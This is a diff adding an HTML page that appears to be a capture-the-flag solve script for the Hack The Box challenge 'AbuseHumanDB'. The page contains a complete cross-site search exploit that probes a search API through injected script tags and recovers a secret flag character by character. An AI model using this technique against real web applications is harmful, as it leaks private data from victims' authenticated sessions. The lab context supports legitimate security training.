@@ -1,0 +1,31 @@
+<!-- https://github.com/lex1010/blog/blob/b32cb0922026cf81e4b67dbdc99add152049ca31/docs/HTB/Web/abusehumandb.md -->
+<!-- https://skelter.hashnode.dev/htb-abusehumandb-writeup -->
+<!-- https://medium.com/@skelter/htb-abusehumandb-661ea8acb5b6 -->
+
+<html>
+<script>
+var ip = '46.101.14.124:31467';
+var flag = 'HTB{'; // init search word
+var letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_';
+var url = `http://${ip}/api/entries/search?q=`;
+async function getLetter(ch){
+  return new Promise((resolve, reject)=>{
+    const script = document.createElement("script");
+    script.src = url+encodeURIComponent(flag+ch);
+    script.onload = () => ch==='}' ? reject(ch):resolve(ch);
+    script.onerror = () => reject(ch);
+    document.head.appendChild(script);
+  });
+}
+async function getFullWord(letters) {
+  var b = false; var ch;
+  for(var i=0; i < letters.length; i++){
+    await getLetter(letters[i]).then((res) => {flag=flag.concat(res); b = res==='}' ? true:false; i=0} , (res)=> { } );
+    if(b) break;
+  }
+};
+getFullWord(letters);
+console.log(`Flag is ${flag}`);
+</script>
+<html>
+
